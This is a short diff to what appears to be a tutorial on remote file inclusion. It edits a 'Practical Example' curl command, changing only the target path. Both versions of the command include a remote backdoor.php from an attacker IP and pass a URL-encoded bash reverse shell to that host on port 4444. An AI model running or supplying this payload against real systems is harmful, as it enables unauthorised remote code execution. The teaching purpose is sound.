@@ -93,7 +93,7 @@ Step-by-Step Example
 
 Practical Example
 ```bash
-curl "http://example.com/meteor/index.php?page=http://192.168.45.184/backdoor.php&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.184%2F4444%200%3E%261%22"
+curl "http://example.com/malekblog/index.php?page=http://192.168.45.184/backdoor.php&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.184%2F4444%200%3E%261%22"
 ```
 
 ### Conclusion
